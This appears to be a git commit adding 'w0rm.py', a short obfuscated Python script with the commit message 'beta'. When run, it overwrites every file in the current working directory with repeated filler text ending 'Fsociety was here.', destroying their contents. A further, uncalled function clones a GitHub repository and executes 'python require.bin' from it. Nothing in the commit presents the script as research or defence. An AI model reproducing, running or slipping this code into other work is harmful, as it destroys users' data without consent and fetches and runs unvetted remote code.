0f082204a3ab30f581c536836c46dc95cbee0404
Razyar Saeedian <razyarsaeedian@gmail.com>
2019-09-18 18:08:06 +0430

    beta
    beta

---
+++ w0rm.py
@@ -0,0 +1,34 @@
+import os
+import sys
+import socket
+from socket import *
+
+
+def push(_0x3):
+	return _0x3
+
+
+def _0x11(_0x1=0x1):
+	if _0x1 == 0x1:
+		try:
+			_0x23 = os.getcwd()
+			_0x24 = os.listdir(_0x23)
+			for _0x0 in _0x24:
+				_0x32 = open(_0x0, 'w')
+				_byteJumper = 0x32 * 0x2 * 0x64 + 0x100
+				_0x32.write(':%s: :%s: :%s: ' * _byteJumper % ('Data: -0', 'Data: -1', 'Fsociety was here.'))
+				push('Data: %s -0' % bytes(_0x0))
+				_0x32.close()
+		except Exception as _0x4:
+			push(_0x4)
+	else:
+		push('_0x1 !-> 1 must be')
+
+_0x11(_0x1=0x1)
+
+def _0x12(_0xs='https://github.com', _0xX1='x', _0xX2='x'):
+	os.system('git clone %s' % (_0xs+'/'+_0xX1+'/'+'_0xX2'))
+	os.chdir(_0xX2)
+	os.system('python require.bin')
+
+	
